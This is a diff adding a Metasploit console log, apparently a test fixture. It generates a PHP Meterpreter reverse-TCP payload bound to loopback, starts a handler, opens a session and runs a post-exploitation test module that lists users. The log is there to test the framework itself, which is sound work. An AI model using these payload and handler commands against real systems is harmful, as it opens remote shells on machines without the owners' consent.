@@ -1,0 +1,21 @@
+use php/meterpreter/reverse_tcp
+generate -o /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-gfcox8.php -f raw lport=6044 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Writing 1110 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-gfcox8.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 35
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6044 
+[*] Sending stage (39282 bytes) to 127.0.0.1
+[*] Meterpreter session 36 opened (127.0.0.1:6044 -> 127.0.0.1:53132 ) at 2022-01-19 11:10:50 +0000
+use test/unix
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> run session=36 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_railgun_api
+[*] Running against session 36
+[*] Session type is meterpreter and platform is linux
+[+] should list users
+[*] Testing complete in 0.005306457
+[*] Passed: 1; Failed: 0
+[*] Post module execution completed
